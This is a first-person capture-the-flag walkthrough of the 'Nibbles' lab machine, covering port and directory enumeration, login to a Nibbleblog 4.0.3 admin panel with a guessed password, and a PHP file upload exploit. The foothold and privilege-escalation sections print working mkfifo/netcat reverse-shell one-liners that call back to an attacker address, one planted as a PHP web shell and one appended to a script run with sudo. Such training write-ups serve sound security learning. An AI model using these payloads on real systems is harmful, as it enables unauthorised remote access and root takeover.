
Nibbles Box

#  Enumeration 
I began by running an Nmap scan against the target, which revealed two open ports:  port 22 running on OpenSSH 7.2p2 and HTTP port  80 running on  Apache 2.4.18. 

```bash
# Nmap 7.99 scan initiated Sat Jun 20 15:26:00 2026 as: /usr/lib/nmap/nmap --privileged -Pn -sS -sC -sV -T4 -oN scan 10.129.54.118
Nmap scan report for 10.129.54.118
Host is up (0.43s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 20 15:26:21 2026 -- 1 IP address (1 host up) scanned in 20.63 seconds

```

Navigating to the web server on port 80 displayed a simple 'Hello World' . Checking the page source revealed a hidden comment pointing to the /nibbleblog/ directory 

The /nibbleblog directory turned out to be a Nibbleblog CMS installation. I ran Gobuster to discover hidden directories.

```bash 
──(kali㉿kali)-[~/Desktop/HTB/GettingStarted]
└─$ gobuster dir -u http://10.129.54.118/nibbleblog/  -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.54.118/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 308]
.hta                 (Status: 403) [Size: 303]
.htpasswd            (Status: 403) [Size: 308]
README               (Status: 200) [Size: 4628]
admin                (Status: 301) [Size: 325] [--> http://10.129.54.118/nibbleblog/admin/]
admin.php            (Status: 200) [Size: 1401]
content              (Status: 301) [Size: 327] [--> http://10.129.54.118/nibbleblog/content/]
Progress: 1678 / 4750 (35.33%)
index.php            (Status: 200) [Size: 2987]
languages            (Status: 301) [Size: 329] [--> http://10.129.54.118/nibbleblog/languages/]
plugins              (Status: 301) [Size: 327] [--> http://10.129.54.118/nibbleblog/plugins/]
themes               (Status: 301) [Size: 326] [--> http://10.129.54.118/nibbleblog/themes/]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================

```
Gobuster returned several interesting results. I started with the README file ,which revealed that target was running Nibbleblog version 4.0.3

I searched for known exploits using Searchploit and found a file upload vulnerability. 

 Searchsploit showed that Nibbleblog 4.0.3 is vulnerable to an authenticated file upload vulnerability, allowing users to upload PHP files that are executed by the server. Navigating to admin.php revealed a login page. I avoided brute forcing credentials as the application blacklists IPs after too many failed attempts.

The /content directory stood out. directory listing was enabled, meaning the entire folder structure was exposed. Navigating through he directories led me to /nibbleblog/content/private/users.xml. 

The users.xml file confirmed 'admin' as the username. Checking /nibbleblog/content/private/config.xml, I noticed 'nibbles' referenced twice in the configuration. it was worth trying as a password, and it worked. I was logged into the Nibbleblog admin panel 

### Foothold 

The dashboard showed recent activity and notifications. I navigated to the Plugins section to explore further. 

The Plugins section revealed the My Image plugin, which accepted file uploads with no file type restriction, confirming the authenticated file upload vulnerability. Before uploading a full reverse shell, I tested code execution by uploading `<?php system('id'); ?>`. Visiting /nibbleblog/content/private/plugins/my_image/image.php confirmed the file executed and returned the output of the id command. I then uploaded the following PHP reverse shell  
```
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
```
With a Netcat listener running , I triggered execution by visiting the same path.
###  Post-Exploitation

after receiving the shell , i upgraded it to a stably TTY using Python. Enumrating the home directory i found the first flag (user.txt) and stood out a Personal.zip file . Unzipping it exposed bash script at /home/nibbler/personal/stuff/monitor.sh 

### Privilege Escalation

Privilege escalation enumeration could've been automated using LinEnum, transferred via a Python HTTPserver. However, running sudo -l manually was sufficient . it showed that nibbler could execute /home/nibbler/personal/stuff/monitor.sh as root without a password. 

since nibbler owend monitor.sh and had write permission, I appended a reverse shell to the end of the file, set up a Netcat listener , and ran the script with sudo , triggering the reverse shell as root 

```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh
```

```
sudo /home/nibbler/personal/stuff/monitor.sh
```
























